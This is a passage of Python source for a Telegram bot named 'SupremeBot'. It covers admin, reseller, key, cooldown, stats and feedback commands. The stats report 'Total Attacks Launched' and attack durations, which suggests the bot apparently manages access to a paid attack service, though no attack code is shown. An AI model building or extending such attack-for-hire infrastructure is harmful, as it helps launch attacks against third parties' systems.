    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if user_id in users:
        expiration = users[user_id]["expiration"]
        context = users[user_id]["context"]
        response = f"User Info:\nUserID: {user_id}\nUsername: @{username}\nExpiration: {expiration}\nContext: {context}"
    elif user_id in authorized_users:
        response = f"User Info:\nUserID: {user_id}\nUsername: @{username}\nStatus: Authorized (No Expiration)"
    else:
        response = f"User Info:\nUserID: {user_id}\nUsername: @{username}\nStatus: Not Authorized"

    safe_reply(bot, message, response)
    log_action(user_id, username, "/myinfo", response=response)

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    stats["command_usage"]["listkeys"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_admin(user_id, username):
        safe_reply(bot, message, "Error: Only Admins and Overlords can use this command.")
        log_action(user_id, username, "/listkeys", "Unauthorized", "Error: Not authorized")
        return

    if not keys:
        safe_reply(bot, message, "No keys available.")
        log_action(user_id, username, "/listkeys", "No keys", "No keys available")
        return

    key_list = []
    for key, info in keys.items():
        key_list.append(
            f"Key: {key}\n"
            f"Duration: {info['duration']}\n"
            f"Device Limit: {info['device_limit']}\n"
            f"Devices: {len(info['devices'])}\n"
            f"Blocked: {info.get('blocked', False)}\n"
            f"Context: {info.get('context', 'N/A')}\n"
        )
    response = "🔑 **List of Keys** 🔑\n\n" + "\n".join(key_list)
    safe_reply(bot, message, response)
    log_action(user_id, username, "/listkeys", response=response)

@bot.message_handler(commands=['block'])
def block_key(message):
    stats["command_usage"]["block"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_admin(user_id, username):
        safe_reply(bot, message, "Error: Only Admins and Overlords can use this command.")
        log_action(user_id, username, "/block", "Unauthorized", "Error: Not authorized")
        return

    try:
        command = message.text.split()
        if len(command) != 2:
            safe_reply(bot, message, "Usage: /block <key>")
            log_action(user_id, username, "/block", "Invalid command format", "Usage prompt sent")
            return

        key = command[1]
        if key not in keys:
            safe_reply(bot, message, "Invalid key!")
            log_action(user_id, username, "/block", f"Invalid key: {key}", "Error: Invalid key")
            return

        keys[key]["blocked"] = True
        save_data()
        response = f"Key '{key}' has been blocked!"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Key: {key}", response)
    except Exception as e:
        safe_reply(bot, message, "An error occurred. Please contact the admin.")
        log_error(f"Error in /block: {str(e)}", user_id, username)

@bot.message_handler(commands=['add'])
def add_user(message):
    stats["command_usage"]["add"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_admin(user_id, username):
        safe_reply(bot, message, "Error: Only Admins and Overlords can use this command.")
        log_action(user_id, username, "/add", "Unauthorized", "Error: Not authorized")
        return

    try:
        command = message.text.split()
        if len(command) != 2:
            safe_reply(bot, message, "Usage: /add <user_id>")
            log_action(user_id, username, "/add", "Invalid command format", "Usage prompt sent")
            return

        target_user_id = command[1]
        if target_user_id in authorized_users:
            safe_reply(bot, message, "User is already authorized!")
            log_action(user_id, username, "/add", f"User already authorized: {target_user_id}", "Error: Already authorized")
            return

        authorized_users[target_user_id] = {"added_by": user_id, "added_at": datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}
        save_data()
        response = f"User {target_user_id} has been authorized!"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"User: {target_user_id}", response)
    except Exception as e:
        safe_reply(bot, message, "An error occurred. Please contact the admin.")
        log_error(f"Error in /add: {str(e)}", user_id, username)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    stats["command_usage"]["remove"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_admin(user_id, username):
        safe_reply(bot, message, "Error: Only Admins and Overlords can use this command.")
        log_action(user_id, username, "/remove", "Unauthorized", "Error: Not authorized")
        return

    try:
        command = message.text.split()
        if len(command) != 2:
            safe_reply(bot, message, "Usage: /remove <user_id>")
            log_action(user_id, username, "/remove", "Invalid command format", "Usage prompt sent")
            return

        target_user_id = command[1]
        if target_user_id not in authorized_users:
            safe_reply(bot, message, "User is not authorized!")
            log_action(user_id, username, "/remove", f"User not authorized: {target_user_id}", "Error: Not authorized")
            return

        del authorized_users[target_user_id]
        save_data()
        response = f"User {target_user_id} has been removed!"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"User: {target_user_id}", response)
    except Exception as e:
        safe_reply(bot, message, "An error occurred. Please contact the admin.")
        log_error(f"Error in /remove: {str(e)}", user_id, username)

@bot.message_handler(commands=['users'])
def list_users(message):
    stats["command_usage"]["users"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_admin(user_id, username):
        safe_reply(bot, message, "Error: Only Admins and Overlords can use this command.")
        log_action(user_id, username, "/users", "Unauthorized", "Error: Not authorized")
        return

    if not authorized_users and not users:
        safe_reply(bot, message, "No authorized users.")
        log_action(user_id, username, "/users", "No users", "No authorized users")
        return

    user_list = []
    for uid, info in authorized_users.items():
        user_list.append(f"UserID: {uid}\nAdded By: {info['added_by']}\nAdded At: {info['added_at']}\n")
    for uid, info in users.items():
        user_list.append(f"UserID: {uid}\nExpiration: {info['expiration']}\nContext: {info['context']}\n")

    response = "👥 **Authorized Users** 👥\n\n" + "\n".join(user_list)
    safe_reply(bot, message, response)
    log_action(user_id, username, "/users", response=response)

@bot.message_handler(commands=['logs'])
def show_logs(message):
    stats["command_usage"]["logs"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_admin(user_id, username):
        safe_reply(bot, message, "Error: Only Admins and Overlords can use this command.")
        log_action(user_id, username, "/logs", "Unauthorized", "Error: Not authorized")
        return

    try:
        with open(LOG_FILE, "r", encoding='utf-8') as file:
            logs = file.readlines()
        if not logs:
            safe_reply(bot, message, "No logs available.")
            log_action(user_id, username, "/logs", "No logs", "No logs available")
            return

        # Show last 5 log entries
        log_entries = "".join(logs[-5:])
        response = "📜 **Recent Logs** 📜\n\n" + log_entries
        safe_reply(bot, message, response)
        log_action(user_id, username, "/logs", response=response)
    except Exception as e:
        safe_reply(bot, message, "An error occurred. Please contact the admin.")
        log_error(f"Error in /logs: {str(e)}", user_id, username)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    stats["command_usage"]["addadmin"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_overlord(user_id, username):
        safe_reply(bot, message, "Error: Only Overlords can use this command.")
        log_action(user_id, username, "/addadmin", "Unauthorized", "Error: Not authorized")
        return

    try:
        command = message.text.split()
        if len(command) != 2:
            safe_reply(bot, message, "Usage: /addadmin <user_id>")
            log_action(user_id, username, "/addadmin", "Invalid command format", "Usage prompt sent")
            return

        target_user_id = command[1]
        if target_user_id in admin_id:
            safe_reply(bot, message, "User is already an admin!")
            log_action(user_id, username, "/addadmin", f"User already admin: {target_user_id}", "Error: Already admin")
            return

        admin_id.add(target_user_id)
        save_data()
        response = f"User {target_user_id} has been added as an admin!"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addadmin", f"User: {target_user_id}", response)
    except Exception as e:
        safe_reply(bot, message, "An error occurred. Please contact the admin.")
        log_error(f"Error in /addadmin: {str(e)}", user_id, username)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    stats["command_usage"]["removeadmin"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_overlord(user_id, username):
        safe_reply(bot, message, "Error: Only Overlords can use this command.")
        log_action(user_id, username, "/removeadmin", "Unauthorized", "Error: Not authorized")
        return

    try:
        command = message.text.split()
        if len(command) != 2:
            safe_reply(bot, message, "Usage: /removeadmin <user_id>")
            log_action(user_id, username, "/removeadmin", "Invalid command format", "Usage prompt sent")
            return

        target_user_id = command[1]
        if target_user_id not in admin_id:
            safe_reply(bot, message, "User is not an admin!")
            log_action(user_id, username, "/removeadmin", f"User not admin: {target_user_id}", "Error: Not admin")
            return

        admin_id.remove(target_user_id)
        save_data()
        response = f"User {target_user_id} has been removed from admins!"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removeadmin", f"User: {target_user_id}", response)
    except Exception as e:
        safe_reply(bot, message, "An error occurred. Please contact the admin.")
        log_error(f"Error in /removeadmin: {str(e)}", user_id, username)

@bot.message_handler(commands=['checkadmin'])
def check_admin(message):
    stats["command_usage"]["checkadmin"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_overlord(user_id, username):
        safe_reply(bot, message, "Error: Only Overlords can use this command.")
        log_action(user_id, username, "/checkadmin", "Unauthorized", "Error: Not authorized")
        return

    if not admin_id:
        safe_reply(bot, message, "No admins available.")
        log_action(user_id, username, "/checkadmin", "No admins", "No admins available")
        return

    admin_list = "\n".join([f"UserID: {uid}" for uid in admin_id])
    response = "👑 **Admins** 👑\n\n" + admin_list
    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkadmin", response=response)

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    stats["command_usage"]["addreseller"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_overlord(user_id, username):
        safe_reply(bot, message, "Error: Only Overlords can use this command.")
        log_action(user_id, username, "/addreseller", "Unauthorized", "Error: Not authorized")
        return

    try:
        command = message.text.split()
        if len(command) != 2:
            safe_reply(bot, message, "Usage: /addreseller <user_id>")
            log_action(user_id, username, "/addreseller", "Invalid command format", "Usage prompt sent")
            return

        target_user_id = command[1]
        if target_user_id in resellers:
            safe_reply(bot, message, "User is already a reseller!")
            log_action(user_id, username, "/addreseller", f"User already reseller: {target_user_id}", "Error: Already reseller")
            return

        resellers[target_user_id] = {"balance": 0}
        save_data()
        response = f"User {target_user_id} has been added as a reseller!"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"User: {target_user_id}", response)
    except Exception as e:
        safe_reply(bot, message, "An error occurred. Please contact the admin.")
        log_error(f"Error in /addreseller: {str(e)}", user_id, username)

@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    stats["command_usage"]["removereseller"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_overlord(user_id, username):
        safe_reply(bot, message, "Error: Only Overlords can use this command.")
        log_action(user_id, username, "/removereseller", "Unauthorized", "Error: Not authorized")
        return

    try:
        command = message.text.split()
        if len(command) != 2:
            safe_reply(bot, message, "Usage: /removereseller <user_id>")
            log_action(user_id, username, "/removereseller", "Invalid command format", "Usage prompt sent")
            return

        target_user_id = command[1]
        if target_user_id not in resellers:
            safe_reply(bot, message, "User is not a reseller!")
            log_action(user_id, username, "/removereseller", f"User not reseller: {target_user_id}", "Error: Not reseller")
            return

        del resellers[target_user_id]
        save_data()
        response = f"User {target_user_id} has been removed from resellers!"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"User: {target_user_id}", response)
    except Exception as e:
        safe_reply(bot, message, "An error occurred. Please contact the admin.")
        log_error(f"Error in /removereseller: {str(e)}", user_id, username)

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    stats["command_usage"]["addbalance"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_overlord(user_id, username):
        safe_reply(bot, message, "Error: Only Overlords can use this command.")
        log_action(user_id, username, "/addbalance", "Unauthorized", "Error: Not authorized")
        return

    try:
        command = message.text.split()
        if len(command) != 3:
            safe_reply(bot, message, "Usage: /addbalance <user_id> <amount>")
            log_action(user_id, username, "/addbalance", "Invalid command format", "Usage prompt sent")
            return

        target_user_id, amount = command[1], command[2]
        if target_user_id not in resellers:
            safe_reply(bot, message, "User is not a reseller!")
            log_action(user_id, username, "/addbalance", f"User not reseller: {target_user_id}", "Error: Not reseller")
            return

        try:
            amount = int(amount)
            if amount <= 0:
                raise ValueError
        except ValueError:
            safe_reply(bot, message, "Amount must be a positive integer!")
            log_action(user_id, username, "/addbalance", f"Invalid amount: {amount}", "Error: Invalid amount")
            return

        resellers[target_user_id]["balance"] += amount
        save_data()
        response = f"Added {amount} to reseller {target_user_id}'s balance. New balance: {resellers[target_user_id]['balance']}"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"User: {target_user_id}, Amount: {amount}", response)
    except Exception as e:
        safe_reply(bot, message, "An error occurred. Please contact the admin.")
        log_error(f"Error in /addbalance: {str(e)}", user_id, username)

@bot.message_handler(commands=['resellers'])
def list_resellers(message):
    stats["command_usage"]["resellers"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_overlord(user_id, username):
        safe_reply(bot, message, "Error: Only Overlords can use this command.")
        log_action(user_id, username, "/resellers", "Unauthorized", "Error: Not authorized")
        return

    if not resellers:
        safe_reply(bot, message, "No resellers available.")
        log_action(user_id, username, "/resellers", "No resellers", "No resellers available")
        return

    reseller_list = []
    for rid, info in resellers.items():
        reseller_list.append(f"UserID: {rid}\nBalance: {info['balance']}\n")
    response = "💰 **Resellers** 💰\n\n" + "\n".join(reseller_list)
    safe_reply(bot, message, response)
    log_action(user_id, username, "/resellers", response=response)

@bot.message_handler(commands=['balance'])
def check_balance(message):
    stats["command_usage"]["balance"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if user_id not in resellers:
        safe_reply(bot, message, "Error: Only resellers can use this command.")
        log_action(user_id, username, "/balance", "Unauthorized", "Error: Not reseller")
        return

    balance = resellers[user_id]["balance"]
    response = f"Your balance: {balance}"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/balance", f"Balance: {balance}", response)

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    stats["command_usage"]["setcooldown"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_admin(user_id, username):
        safe_reply(bot, message, "Error: Only Admins and Overlords can use this command.")
        log_action(user_id, username, "/setcooldown", "Unauthorized", "Error: Not authorized")
        return

    try:
        command = message.text.split()
        if len(command) != 2:
            safe_reply(bot, message, "Usage: /setcooldown <seconds>")
            log_action(user_id, username, "/setcooldown", "Invalid command format", "Usage prompt sent")
            return

        seconds = int(command[1])
        if seconds < 0:
            safe_reply(bot, message, "Cooldown must be a non-negative integer!")
            log_action(user_id, username, "/setcooldown", f"Invalid cooldown: {seconds}", "Error: Invalid cooldown")
            return

        set_cooldown(seconds)
        response = f"Cooldown set to {seconds} seconds."
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Cooldown: {seconds}", response)
    except Exception as e:
        safe_reply(bot, message, "An error occurred. Please contact the admin.")
        log_error(f"Error in /setcooldown: {str(e)}", user_id, username)

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    stats["command_usage"]["checkcooldown"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_admin(user_id, username):
        safe_reply(bot, message, "Error: Only Admins and Overlords can use this command.")
        log_action(user_id, username, "/checkcooldown", "Unauthorized", "Error: Not authorized")
        return

    response = f"Current cooldown: {COOLDOWN_PERIOD} seconds"
    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkcooldown", f"Cooldown: {COOLDOWN_PERIOD}", response)

@bot.message_handler(commands=['stats'])
def show_stats(message):
    stats["command_usage"]["stats"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    if not is_overlord(user_id, username):
        safe_reply(bot, message, "Error: Only Overlords can use this command.")
        log_action(user_id, username, "/stats", "Unauthorized", "Error: Not authorized")
        return

    active_users = update_active_users()
    active_keys = len([key for key, info in keys.items() if not info.get("blocked", False) and (datetime.datetime.now(IST) - datetime.datetime.strptime(info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)).total_seconds() < sum(parse_duration(info["duration"])[:3]) * 60])
    command_usage_str = "\n".join([f"📜 **/{cmd}**: __{count}__" for cmd, count in stats["command_usage"].items() if count > 0])
    stats_message = (
        "🚀 **SupremeBot Stats** 🚀\n\n"
        f"⏰ **Uptime**: {calculate_uptime()}\n"
        f"👥 **Total Users**: {len(stats['total_users'])}\n"
        f"🟢 **Active Users (last 5 min)**: {active_users}\n"
        f"🔑 **Total Keys Generated**: {stats['total_keys']}\n"
        f"🟢 **Active Keys**: {active_keys}\n"
        f"📈 **Keys Generated/min**: {calculate_keys_per_minute()}\n"
        f"💥 **Total Attacks Launched**: {stats['total_attacks']}\n"
        f"⏳ **Avg Attack Duration**: {calculate_avg_attack_duration()}\n"
        f"🔴 **Expired Keys**: {stats['expired_keys']}\n"
        f"📩 **Total Feedback**: {stats['total_feedback']}\n"
        f"🚨 **Scam Feedback**: {stats['scam_feedback']}\n"
        f"📊 **Command Usage**:\n{command_usage_str}\n"
    )
    safe_reply(bot, message, stats_message)
    log_action(user_id, username, "/stats", response=stats_message)

    # Start live stats dashboard in a separate thread
    if message.chat.type == "private":
        stats_thread = threading.Thread(target=live_stats_update, args=(message.chat.id, message.message_id + 1))
        stats_thread.start()

@bot.message_handler(commands=['feedback'])
def submit_feedback(message):
    stats["command_usage"]["feedback"] += 1
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})

    try:
        command = message.text.split(maxsplit=1)
        if len(command) != 2:
            safe_reply(bot, message, "Usage: /feedback <text>")
            log_action(user_id, username, "/feedback", "Invalid command format", "Usage prompt sent")
            return

        feedback_text = command[1]
        current_time = datetime.datetime.now(IST)

        # Check feedback cooldown (24 hours)
        if user_id in feedback_data:
            last_feedback_time = datetime.datetime.strptime(feedback_data[user_id]["last_feedback_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if (current_time - last_feedback_time).total_seconds() < 24 * 3600:
                remaining = int(24 * 3600 - (current_time - last_feedback_time).total_seconds())
                hours, remainder = divmod(remaining, 3600)
                minutes, seconds = divmod(remainder, 60)
                safe_reply(bot, message, f"Please wait {hours}h {minutes}m {seconds}s before submitting another feedback.")
                log_action(user_id, username, "/feedback", f"Cooldown active, remaining: {remaining}s", f"Cooldown error: {hours}h {minutes}m {seconds}s remaining")
                return

        # Check for scam-related words
        scam_words = ["scam", "fraud", "cheat", "fake"]
        is_scam = any(word in feedback_text.lower() for word in scam_words)

        feedback_data[user_id] = {
            "last_feedback_time": current_time.strftime('%Y-%m-%d %I:%M:%S %p'),
            "feedback_text": feedback_text,
            "is_scam": is_scam,
            "scam_time": current_time.strftime('%Y-%m-%d %I:%M:%S %p') if is_scam else None
        }
        stats["total_feedback"] += 1
        if is_scam:
            stats["scam_feedback"] += 1
        save_data()

        response = "Thank you for your feedback!"
        safe_reply(bot, message, response)
        log_action(user_id, username, "/feedback", f"Feedback: {feedback_text}, Is Scam: {is_scam}", response)
    except Exception as e:
        safe_reply(bot, message, "An error occurred. Please contact the admin.")
        log_error(f"Error in /feedback: {str(e)}", user_id, username)

# Shutdown Handler
def signal_handler(sig, frame):
    print("Shutting down SupremeBot...")
    for chat_id in known_chats:
        try:
            bot.send_message(chat_id, shutdown_message, parse_mode="HTML")
        except Exception as e:
            log_error(f"Error sending shutdown message to chat {chat_id}: {str(e)}", "SYSTEM", "SYSTEM")
    bot.stop_polling()
    save_data()
    sys.exit(0)

# Register signal handlers
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# Start the bot
if __name__ == "__main__":
    print("SupremeBot is starting...")
    load_data()
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        log_error(f"Bot polling error: {str(e)}", "SYSTEM", "SYSTEM")
        print(f"Bot crashed with error: {e}")
        # Attempt to restart the bot
        time.sleep(5)
        print("Restarting SupremeBot...")
        os.execv(sys.executable, ['python'] + sys.argv)